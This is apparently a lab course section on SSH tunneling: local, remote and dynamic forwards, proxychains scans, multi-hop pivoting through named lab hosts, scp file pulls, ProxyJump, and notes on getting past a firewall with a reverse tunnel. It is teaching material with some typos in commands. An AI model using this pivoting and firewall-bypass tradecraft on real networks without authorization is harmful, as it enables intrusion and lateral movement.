![image](https://github.com/ruppertaj/WOBC/assets/93789685/bcb6b911-447e-4969-aaa3-ed5fb55836b0)

- Creates 5580 on the Internet_Host mapped to port 80 of Blue_INT_DMZ_Host-1.
```
Blue_DMZ_Host-1~$ ssh student@10.10.0.40 -R 5580:172.16.40.10:80 -NT
or
Blue_DMZ_Host-1~$ ssh -R 5580:172.16.40.10:80 student@10.10.0.40 -NT
```
The above command performs the following:
- The Blue_DMZ_Host-1 (client) authenticates to the server (remote host 10.10.0.40) with student’s credentials.
- Establishes a local port bind (5580) on the server (Internet_Host).
- On the Internet_Host port 127.0.0.1:5580 forwards to the target 172.16.40.10:80 via the client 172.16.1.15.
- Sets options for no terminal prompt.

Now all traffic that goes to socket 127.0.0.1:5580 on the local machine (Internet_Host) will be sent to 172.16.40.10:80.
```
$ firefox http://localhost:5580
{Webpage of Blue_INT_DMZ_Host-1}
```

---
### 4.5.4 Combining Local and Remote Port Forwarding
Combining local and remote port forwarding with SSH allows you to create complex network configurations that suit various use cases. This combination enables you to establish tunnels between multiple hosts, providing flexibility in how you route and access network resources.

If you require SSH access to a remote system that doesn’t allow SSH connections from external IP addresses, you’ll need to rely on an "insider" or an individual within the network to grant you access to their SSH port. This is commonly achieved through the utilization of different exploits.

In this course we will not be using exploits to grant us access. To simulate this we will grant access to a system via telnet (TCP port 23). You will then telnet into the system and then create a remote (-R) port forward back to a system we do have SSH access to.


---
#### 4.5.4.1 Bridging Local and Remote Port Forwarding
Bridging local and remote port forwarding involves combining these SSH tunneling techniques to create a comprehensive network configuration. This approach enables you to route traffic between multiple hosts efficiently.

In a situation where a remote target past the pivot is only accessiable via telnet we will need to perform the following steps.



bridge



1. From Internet_Host (10.10.0.40), create Local Port Forwarding to target telnet (TCP port 23) of Blue_INT_DMZ_Host-1 (172.16.40.10):
Create 2223 on the Internet_Host (10.10.0.40) mapped to port 23 of Blue_INT_DMZ_Host-1 (172.16.40.10) via the server Blue_DMZ_Host-1 (172.16.1.15).

$ ssh student@172.16.1.15 -L 2223:172.16.40.10:23 -NT
or
$ ssh -L 2223:172.16.40.10:23 student@172.16.1.15 -NT
The command performs the following:

The Internet_Host (client) authenticates to the server (remote host 172.16.1.15) with student’s credentials.

Establishes a local port bind (2223) on the client (Internet_Host) the command is issued from.

Port forwards to the the target 172.16.40.10 on port 23.

Sets options for no terminal prompt.

Now all traffic that goes to socket 127.0.0.1:2223 on the local machine (Internet_Host) will be sent to 172.16.40.10:23.



2. Telnet to Blue_INT_DMZ_Host-1 (172.16.40.10) using the tunnel 1123 we just created.
$ telnet localhost 2223
Blue_INT_DMZ_Host-1~$


3. From Blue_INT_DMZ_Host-1 (172.16.40.10), create Remote Port 1122 on Blue_DMZ_Host-1 (172.16.1.15):
Create 1122 on the Blue_DMZ_Host-1 mapped to port 22 of Blue_INT_DMZ_Host-1.

Blue_INT_DMZ_Host-1~$ ssh student@172.16.1.15 -R 1122:localhost:22 -NT
or
Blue_INT_DMZ_Host-1~$ ssh -R 1122:localhost:22 student@172.16.1.15 -NT
The above command performs the following:

The Blue_INT_DMZ_Host-1 (client) authenticates to the server (remote host 172.16.1.15) with student’s credentials.

Establishes a local port bind (1122) on the server (Blue_DMZ_Host-1).

On the Blue_DMZ_Host-1 port 127.0.0.1:1122 forwards to the localhost (127.0.0.1) of the client (172.16.40.10) on port 22.

Sets options for no terminal prompt.

Now all traffic that goes to socket 127.0.0.1:1122 on the local machine (Blue_DMZ_Host-1) will be sent to localhost:22 on 172.16.40.10. But this does not give our Internet_Host (10.10.0.40) access to Blue_INT_DMZ_Host-1 (172.16.40.10).



4. From Internet_Host (10.10.0.40), create Local Port Forwarding to target 127.0.0.1:1122 on Blue_DMZ_Host-1 (172.16.1.15):
Creates 2222 on the Internet_Host mapped to the localhost port 2222 of Blue_DMZ_Host-1.

$ ssh student@172.16.1.15 -L 2222:localhost:1122 -NT
or
$ ssh -L 2222:localhost:1122 student@172.16.1.15 -NT
The command performs the following:

The Internet_Host (client) authenticates to the server (remote host 172.16.1.15) with student’s credentials.

Establishes a local port bind (2222) on the client (Internet_Host) the command is issued from.

Port forwards to the localhost (127.0.0.1) of the server (172.16.1.15) on port 2222.

Sets options for no terminal prompt.

Now all traffic that goes to socket 127.0.0.1:1122 on the local machine (Internet_Host) will be sent to localhost:2222 on Blue_DMZ_Host-1 (172.16.1.15). Then traffic from localhost:2222 on Blue_DMZ_Host-1 (172.16.1.15) will be forwarded to port 22 of to Blue_INT_DMZ_Host-1 (172.16.40.10).



5. Create a Dynamic tunnel on the Internet_Host (10.10.0.40) using the local port 2222 we just created:
$ ssh student@localhost -p 2222 -D 9050 -NT
or
$ ssh -D 9050 student@localhost -p 2222 -NT
The above command does the following:

Authenticates to Blue_INT_DMZ_Host-1 (172.16.40.10) by calling the local port 2222 we establish from the SSH tunnel from prior.

Opens up a Dynamic Port Forward with port 9050 (Be sure to close out any other dynamic tunnels using port 9050 first).

Sets options for verbosity and no terminal prompt.

$ proxychains ./scan.sh
$ proxychains nmap -Pn -sT 172.16.82.96/27 -p 21-23,80
$ proxychains ssh student@172.16.82.106
$ proxychains telnet 172.16.82.106
$ proxychains wget -r http://172.16.82.106
$ proxychains wget -r ftp://172.16.82.106


References:  
https://www.tunnelsup.com/how-to-create-ssh-tunnels/  
https://onedrive.live.com/view.aspx?resid=2F6F542CFFBDFABC!26133&ithint=file%2cxlsx&authkey=!AG_NBXEw-OZjqWE  
https://hackertarget.com/ssh-examples-tunnels/  
https://github.com/haad/proxychains  


---
## 4.6 Perform SSH Practice
In situations where you are familiar with the environment and the systems you will need to tunnel through, you can combine your separate tunnels into a one-liner. Other times it would make more sense to write multiple commands to simplify things for yourself. Here are some examples of how to put them into writing.


---
### 4.6.1 Scan first pivot
Start

tp1

We first identify our starting system. This system will be used as our main pivot into the remote network. In the begining we are only given its public facing "Float Address" (10.50.x.x). We will need to scan this address to identify possible access ports such as SSH or TELNET for remote access.

First Pivot External Active Recon

tp2

internet_host$ ./scan.sh
Upon performing an active scan on the pivot system we identify and map any open TCP or UDP ports.

If HTTP ports are open we can use wget, curl, or a web-browser like firefox to interact with it. If the HTTP is running on an alternate port we can use the <ip>:<port> to interact with it.

wget -r http://10.50.x.x/ or wget -r [port](http://10.50.x.x/)

curl http://10.50.x.x/ or curl [port](http://10.50.x.x/)

firefox 10.50.x.x or `firefox 10.50.x.x:[port]

If FTP port is open we can use wget, curl or ftp to interact with it.

wget -r ftp://10.50.x.x/

curl ftp://10.50.x.x/ or curl ftp://10.50.x.x/file

ftp 10.50.x.x

If SSH, Telnet, or any other ports are open we can banner grab these ports to verify the service is running on the ports.

nc 10.50.x.x [port]

telnet 10.50.x.x or telnet 10.50.x.x [port]

ssh [username]@10.50.x.x or ssh [username]@10.50.x.x -p [port]


---
### 4.6.2 Enumerate first pivot
First Pivot Internal Passive Recon

tp3

ssh john@<float ip>
Upon access to the remote system you can perform passive enumeration.

We can identify the hostname by examining the prompt or by running the hostname command.

ip address or ifconfig or ipconfig to gather the internal ip address and CIDR. These together will allow you to determine the usable ip range of the internal network. This will also allow us to see any additional networks the system may be connected to.

ip neighbor or arp -a to gather information about other possible devices on the network. This will only give you details about devices that the system has communicated with recently.

ss -antlp or netstat -antlp to gather information about other listening service ports on the system. This may differ from your active scans as firewalls can limit the ports you are able to view from remote.

ps -elf to check for running processes on the system. This will give you alot of information so grepping for specific services may be required.

find / -iname [filename] 2>/dev/null can be used to look for interesting files on the system.

`ls /usr/share/cctc' to determine if any artifacts of interest are in the share directory.

To pull any files found:

internet_host$ scp john@10.50.x.x:/usr/share/cctc/john.png .


---
### 4.6.3 Scan second pivot
Second Pivot External Active Recon

tp4

internet_host$ ssh john@[float ip] -D 9050 -NT
internet_host$ proxychains ./scan.sh
To enumerate the system beyond our first pivot we establish a Dynamic tunnel (-D) on port 9050 to John who is our first pivot and proxy.

We use proxychains to send our TCP scans thru the Dynamic tunnel and will enumerate thru our proxy.

Thru the scans we find other systems on the network by their IP address and the service ports on them.

Here we discover the host Jack (104.16.181.15) and it has SSH running on port 22.

Upon performing an active scan on the pivot system we identify and map any open TCP or UDP ports.

If HTTP ports are open we can use wget or curl. If the HTTP is running on an alternate port we can use the <ip>:<port> to interact with it.

proxychains wget -r http://104.16.181.15/ or proxychains wget -r [port](http://104.16.181.15/)

proxychains curl http://104.16.181.15`/ or `proxychains curl [port](http://104.16.181.15/)

If FTP port is open we can use wget, curl or ftp to interact with it.

proxychains wget -r ftp://104.16.181.15/

proxychains curl ftp://104.16.181.15/ or proxychains curl ftp://104.16.181.15/file

proxychains ftp 104.16.181.15 and switch to passive mode.

If SSH, Telnet, or any other ports are open we can banner grab these ports to verify the service is running on the ports.

proxychains nc 104.16.181.15 [port]

proxychains telnet 104.16.181.15 or proxychains telnet 104.16.181.15 [port]

proxychains ssh [username]@104.16.181.15 or proxychains ssh [username]@104.16.181.15 -p [port]


---
### 4.6.4 Enumerate second pivot
Second Pivot Internal Passive Recon

tp5

internet_host$ proxychains ssh jack@104.16.181.15
Here you can perform the same passive recon steps as before.

To pull any files from Jack:

internet_host$ proxychains scp jack@104.16.181.15:/usr/share/cctc/jack.png .


---
### 4.6.5 Scan third pivot
Third Pivot External Active Recon

tp6

<close the previous dynamic tunnel>
internet_host$ ssh john@[float ip] -L 1111:104.16.181.15:22 -NT
internet_host$ ssh jack@localhost -p 1111 -D 9050 -NT
internet_host$ proxychains ./scan.sh
To enumerate beyond Jack we must close the dynamic tunnel to John.

We use John as our pivot to setup a local-port-forward (1111) to Jack targeting Jack’s ssh port (22).

We then setup a new dynamic tunnel to Jack (1111).

We are able to authenticate to Jack by calling the localhost -p 1111 which is the tunnel we setup that targets Jack’s ssh port.

We use proxychains to send our TCP scans thru the Dynamic tunnel and will enumerate thru our proxy.

Thru the scans we find other systems on the network by their IP address and the service ports on them.

Upon performing an active scan on the pivot system we identify and map any open TCP or UDP ports.

If HTTP ports are open we can use wget or curl. If the HTTP is running on an alternate port we can use the [ip]:[port] to interact with it.

proxychains wget -r http://142.16.8.32/ or proxychains wget -r [port](http://142.16.8.32/)

proxychains curl http://142.16.8.32/ or proxychains curl [port](http://142.16.8.32/)

If FTP port is open we can use wget, curl or ftp to interact with it.

proxychains wget -r ftp://142.16.8.32/

proxychains curl ftp://142.16.8.32/ or proxychains curl ftp://142.16.8.32/file

proxychains ftp 142.16.8.32 and switch to passive mode.

If SSH, Telnet, or any other ports are open we can banner grab these ports to verify the service is running on the ports.

proxychains nc 142.16.8.32 [port]

proxychains telnet 142.16.8.32 or proxychains telnet 142.16.8.32 [port]

proxychains ssh [username]@142.16.8.32 or proxychains ssh [username]@142.16.8.32 -p [port]

Here we discover the host Bill (142.16.8.32) and it has SSH running on port 4567.


---
### 4.6.6 Enumerate third pivot
Third Pivot Internal Passive Recon

tp7

internet_host$ proxychains ssh bill@142.16.8.32 -p 4567
Here you can perform the same passive recon steps as before.

To pull any files from Bill:

internet_host$ proxychains scp -P 4567 bill@142.16.8.32:/usr/share/cctc/bill.png .


---
### 4.6.7 Scan forth pivot
Forth Pivot External Active Recon

tp8

<close the previous dynamic tunnel>
internet_host$ ssh jack@localhost -p 1111 -L 2222:142.16.8.32:4567 -NT
internet_host$ ssh bill@localhost -p 2222 -D 9050 -NT
internet_host$ proxychains ./scan.sh
To enumerate beyond Bill we must close the dynamic tunnel to Jack.

We use Jack as our pivot (1111) to setup a local-port-forward (2222) to Bill targeting Bill’s ssh port (4567).

We then setup a new dynamic tunnel to Bill (2222).

We are able to authenticate to Bill by calling the localhost -p 2222 which is the tunnel we setup that targets Bill’s ssh port.

We use proxychains to send our TCP scans thru the Dynamic tunnel and will enumerate thru our proxy.

Thru the scans we find other systems on the network by their IP address and the service ports on them.

Upon performing an active scan on the pivot system we identify and map any open TCP or UDP ports.

If HTTP ports are open we can use wget or curl. If the HTTP is running on an alternate port we can use the <ip>:<port> to interact with it.

proxychains wget -r http://155.39.88.21/ or proxychains wget -r [port](http://155.39.88.21/)

proxychains curl http://155.39.88.21/ or proxychains curl [port](http://155.39.88.21/)

If FTP port is open we can use wget, curl or ftp to interact with it.

proxychains wget -r ftp://155.39.88.21/

proxychains curl ftp://155.39.88.21/ or proxychains curl ftp://155.39.88.21/file

proxychains ftp 155.39.88.21 and switch to passive mode.

If SSH, Telnet, or any other ports are open we can banner grab these ports to verify the service is running on the ports.

proxychains nc 155.39.88.21 [port]

proxychains telnet 155.39.88.21 or proxychains telnet 155.39.88.21 [port]

proxychains ssh [username]@155.39.88.21 or proxychains ssh [username]@155.39.88.21 -p [port]

Here we discover the host Brian (155.39.88.21) and it does NOT seem to have an SSH port but it does have Telnet open on port 23.


---
### 4.6.8 Enumerate forth pivot
Forth Pivot Internal Passive Recon

tp8

internet_host$ proxychains telnet 155.39.88.21
Here you can perform the same passive recon steps as before.

We are not able to extract any files thru our telnet connection. We need to determine if we can establish an remote ssh connection first by determining if SSH is running on the system.

DO NOT ESTABLISH A REMOTE SSH CONNECTION FROM A PROXYCHAINS TELNET SESSION. ONCE YOU KILL YOUR DYNAMIC TUNNEL YOU WILL LOOSE CONNECTION TO THIS SYSTEM AND YOUR REMOTE SSH WILL CLOSE.


---
### 4.6.9 Scan fifth pivot
Fifth Pivot External Active Recon

tp9

<close the previous dynamic tunnel>
internet_host$ ssh bill@localhost -p 2222 -L 3333:155.39.88.21:23 -NT
internet_host$ telnet localhost 3333
brian$ ssh bill@155.39.88.17 -p 4567 -R 4444:localhost:22 -NT
internet_host$ ssh bill@localhost -p 2222 -L 5555:localhost:4444 -NT
internet_host$ ssh brian@localhost -p 5555 -D 9050 -NT
internet_host$ proxychains ./scan.sh
To enumerate beyond Brian we must close the dynamic tunnel to Bill.

We use Bill as our pivot (2222) to setup a local-port-forward (3333) to Brian targeting Brian’s telnet port (23).

We then telnet to the local port 3333. This will allow us to telnet to Brian.

On Brian we ssh to Bill on his ssh port (4567) and setup a remote-port-forward by creating (4444) on Bill that is mapped to Brian’s localhost:22.

We then use Bill as our pivot (2222) to setup a local-port-forward (5555) to Bill’s own localhost:4444. 4444 is the port we create on Bill using the remote-port-forward from Brian.

We then setup a new dynamic tunnel to Brian (5555).

We are able to authenticate to Brian by calling the localhost -p 5555 which is the tunnel we setup that targets Brian’s ssh port.

We use proxychains to send our TCP scans thru the Dynamic tunnel and will enumerate thru our proxy.

Thru the scans we find other systems on the network by their IP address and the service ports on them.

Upon performing an active scan on the pivot system we identify and map any open TCP or UDP ports.

If HTTP ports are open we can use wget or curl. If the HTTP is running on an alternate port we can use the <ip>:<port> to interact with it.

proxychains wget -r http://150.21.99.8/ or proxychains wget -r [port](http://150.21.99.8/)

proxychains curl http://150.21.99.8/ or proxychains curl [port](http://150.21.99.8/)

If FTP port is open we can use wget, curl or ftp to interact with it.

proxychains wget -r ftp://150.21.99.8/

proxychains curl ftp://150.21.99.8/ or proxychains curl ftp://150.21.99.8/file

proxychains ftp 150.21.99.8 and switch to passive mode.

If SSH, Telnet, or any other ports are open we can banner grab these ports to verify the service is running on the ports.

proxychains nc 150.21.99.8 [port]

proxychains telnet 150.21.99.8 or proxychains telnet 150.21.99.8 [port]

proxychains ssh [username]@150.21.99.8 or proxychains ssh [username]@150.21.99.8 -p [port]

To pull any files from Brian:

internet_host$ proxychains scp brian@localhost:/usr/share/cctc/brian.png .

We use localhost because our proxy is Brian himself.

Here we discover the host Bob (150.21.99.8) and it has SSH running on port 6789.


---
### 4.6.10 Enumerate fifth pivot
Fifth Pivot Internal Passive Recon

tp10

internet_host$ proxychains ssh bob@@150.21.99.8 -p 6789
Here you can perform the same passive recon steps as before.

To pull any files from Bob:

internet_host$ proxychains scp -P 6789 bob@150.21.99.8:/usr/share/cctc/bob.png .


---
### 4.6.11 Scan sixth pivot
Sixth Pivot External Active Recon

tp12

<close the previous dynamic tunnel>
internet_host$ ssh ssh brian@localhost -p 5555 -L 6666:150.21.99.8:6789 -NT
internet_host$ ssh bob@localhost -p 6666 -D 9050 -NT
internet_host$ proxychains ./scan.sh
To enumerate beyond Bob we must close the dynamic tunnel to Brian.

We use Brian as our pivot (5555) to setup a local-port-forward (6666) to Bob targeting Bob’s ssh port (6789).

We then setup a new dynamic tunnel to Bob (6666).

We are able to authenticate to Bob by calling the localhost -p 6666 which is the tunnel we setup that targets Bob’s ssh port.

We use proxychains to send our TCP scans thru the Dynamic tunnel and will enumerate thru our proxy.

Thru the scans we find other systems on the network by their IP address and the service ports on them.

Upon performing an active scan on the pivot system we identify and map any open TCP or UDP ports.

If HTTP ports are open we can use wget or curl. If the HTTP is running on an alternate port we can use the <ip>:<port> to interact with it.

proxychains wget -r http://201.10.101.11/ or proxychains wget -r [port](http://201.10.101.11/)

proxychains curl http://201.10.101.11/ or proxychains curl [port](http://201.10.101.11/)

If FTP port is open we can use wget, curl or ftp to interact with it.

proxychains wget -r ftp://201.10.101.11/

proxychains curl ftp://201.10.101.11/ or proxychains curl ftp://201.10.101.11/file

proxychains ftp 201.10.101.11 and switch to passive mode.

If SSH, Telnet, or any other ports are open we can banner grab these ports to verify the service is running on the ports.

proxychains nc 201.10.101.11 [port]

proxychains telnet 201.10.101.11 or proxychains telnet 201.10.101.11 [port]

proxychains ssh [username]@201.10.101.11 or proxychains ssh [username]@201.10.101.11 -p [port]

Here we discover the host Jill (201.10.101.11) and it does NOT seem to have an SSH port but it does have Telnet open on port 23.


---
### 4.6.12 Enumerate sixth pivot
Sixth Pivot Internal Passive Recon

tp13

internet_host$ proxychains telnet 201.10.101.11
Here you can perform the same passive recon steps as before.

We are not able to extract any files thru our telnet connection. We need to determine if we can establish an remote ssh connection first by determining if SSH is running on the system.

DO NOT ESTABLISH A REMOTE SSH CONNECTION FROM A PROXYCHAINS TELNET SESSION. ONCE YOU KILL YOUR DYNAMIC TUNNEL YOU WILL LOOSE CONNECTION TO THIS SYSTEM AND YOUR REMOTE SSH WILL CLOSE.


---
### 4.6.13 Scan seventh pivot
Seventh Pivot External Active Recon

tp14

<close the previous dynamic tunnel>
internet_host$ ssh bob@localhost -p 6666 -L 7777:201.10.101.11:23 -NT
internet_host$ telnet localhost 7777
jill$ ssh bob@201.10.101.10 -p 6789 -R 8888:localhost:9876 -NT
internet_host$ ssh bob@localhost -p 6666 -L 9999:localhost:8888 -NT
internet_host$ ssh jill@localhost -p 9999 -D 9050 -NT
internet_host$ proxychains ./scan.sh
To enumerate beyond Jill we must close the dynamic tunnel to Bob.

We use Bob as our pivot (6666) to setup a local-port-forward (7777) to Brian targeting Jill’s telnet port (23).

We then telnet to the local port 7777. This will allow us to telnet to Jill.

On Jill we ssh to Bob on his ssh port (6789) and setup a remote-port-forward by creating (8888) on Bob that is mapped to Jill’s localhost:9876.

We then use Bob as our pivot (6666) to setup a local-port-forward (9999) to Bob’s own localhost:8888. 8888 is the port we create on Bob using the remote-port-forward from Jill.

We then setup a new dynamic tunnel to Jill (9999).

We are able to authenticate to Jill by calling the localhost -p 9999 which is the tunnel we setup that targets Jill’s ssh port.

We use proxychains to send our TCP scans thru the Dynamic tunnel and will enumerate thru our proxy.

Thru the scans we find other systems on the network by their IP address and the service ports on them.

Upon performing an active scan on the pivot system we identify and map any open TCP or UDP ports.

If HTTP ports are open we can use wget or curl. If the HTTP is running on an alternate port we can use the <ip>:<port> to interact with it

proxychains wget -r http://52.20.180.148/ or proxychains wget -r [port](http://52.20.180.148/)

proxychains curl http://52.20.180.148/ or proxychains curl [port](http://52.20.180.148/)

If FTP port is open we can use wget, curl or ftp to interact with it.

proxychains wget -r ftp://52.20.180.148/

proxychains curl ftp://52.20.180.148/ or proxychains curl ftp://52.20.180.148/file

proxychains ftp 52.20.180.148 and switch to passive mode.

If SSH, Telnet, or any other ports are open we can banner grab these ports to verify the service is running on the ports.

proxychains nc 52.20.180.148 [port]

proxychains telnet 52.20.180.148 or proxychains telnet 52.20.180.148 [port]

proxychains ssh [username]@52.20.180.148 or proxychains ssh [username]@52.20.180.148 -p [port]

To pull any files from Jill:

internet_host$ proxychains scp jill@localhost:/usr/share/cctc/jill.png .

We use localhost because our proxy is Jill herself.

Here we discover the host espn (52.20.180.148) and it has no ssh or telnet service running.


---
## 4.7 SSH Proxy Jump
SSH ProxyJump, often referred to as "Jump Host" or "Bastion Host," is a feature in OpenSSH that simplifies SSH connections to remote hosts that are not directly accessible from the local network. It allows you to connect to a target host through an intermediate server (proxy or bastion host) in a single command, streamlining the process of accessing remote systems securely.

Syntax

$ ssh -J <username>@<pivot1 IP>,<username>@<pivot2 IP>,<username>@<pivot3 IP> <username>@<pivot4 IP> -L <local bind port>:<target IP>:<target port> -NT
You can authenticate to as as many intermediate pivots as you need separated by commas (,).

The first pivot is from your local system perspective.

The IP addresses of the pivots past the first pivot are from the perspective of the pivot before.

The final authentication will be the pivot with access to your target.

The local bind port will be created on the local system you run the command on.



DEMO: SSH Proxy-jump Tunneling


For Demonstration purposes only for students that want an extra challenge.



In situations where you are familiar with the environment and the systems you will need to tunnel through, you can combine your separate tunnels into a one-liner.



proxy



In this example we would have to create 3 separate tunnels before we can reach Blue_Priv_Host-1. Each individual tunnel will have its own listening port to correlate to each tunnel. After the first tunnel, each additional tunnel was built by calling the previous tunnel to target the next box in the chain until we get to our ultimate target.

Window 1

$ ssh student@172.16.1.15 -L 1111:172.16.40.10:22 -NT
Window 2

$ ssh student@localhost -p 1111 -L 2222:172.16.82.106:22 -NT
Window 3

$ ssh student@localhost -p 2222 -L 3333:192.168.1.10:22 -NT
Window 4

$ ssh student@localhost -p 3333
Blue_Priv_Host-1~$


If we already know the IP’s and credentials for each "hop" along the way to our target, we can use teh -J option to specify each hop in order. You only need to authenticate to each "hop" along the path. Each hop will be created from the "perspective" of the host before it. This means that if the hosts are on different environments then it must use the "floating" ip address. If the hosts are in the same environments then they will use the internal ip address.

Separate each hop with a comma with the final "pivot" being identified without the comma. You then just need to use the "-L" option the same way as its normally done.

Window 1

$ ssh -J student@172.16.1.15,student@172.16.40.10 student@172.16.82.106 -L 1111:192.168.1.10:22 -NT
student@172.16.1.15 password:
student@172.16.40.10 password:
student@172.16.82.106 password:
{hang}
Window 2

$ ssh student@localhost -p 1111
Blue_Priv_Host-1~$


References:  
https://www.tunnelsup.com/how-to-create-ssh-tunnels/  
https://hackertarget.com/ssh-examples-tunnels/  
https://onedrive.live.com/view.aspx?resid=2F6F542CFFBDFABC!26133&ithint=file%2cxlsx&authkey=!AG_NBXEw-OZjqWE  
https://www.trisul.org/blog/detecting-ssh-tunnels/  
https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6  
https://www.ssh.com/academy/ssh/tunneling/example  
https://www.arridae.com/blogs/SSH-tunnelling.php


---
Quick Notes:
```
# create Listening tunnel from atk-box to target
IHST:$ `ssh student@172.16.82.106 -L 1111:192.168.1.10:22`
client      server                  c port  tgt

# create Reverse tunnel from target to atk-box
BDH1:$ `ssh -R 1234:172.16.82.106:22 student@10.10.0.40`
client         s port  tgt               server
               "alias" for tgt ip 

IHST:$ `ssh student@172.16.82.106 -D 9050`
client       server                  c port

IHST:$ `ssh student@localhost -1111 -D 9050`
client       server thru open -1111    c port
```

- Normal SSH connection
10.10.0.40:54321  -->  172.168.82.106:22

- What if a firewall blocks SSH?
10.10.0.40:54321  --> //FW//    172.168.82.106:22

- We need to try to get around firewall through an accepted firewall port, i.e. telnet
10.10.0.40:54321  --> //FW// -->  172.168.82.106:23

- Now we can create a **Reverse** tunnel to our attack box to create access
BDH1:$ `ssh -R 1234:172.16.82.106:22 student@10.10.0.40`

10.10.0.40:54321  --> //FW// -->  172.168.82.106:23
10.10.0.40:54321  <-- //FW// <--   172.168.82.106:22

- Remove ssh keys after exercise
`rm .ssh/known_hosts`
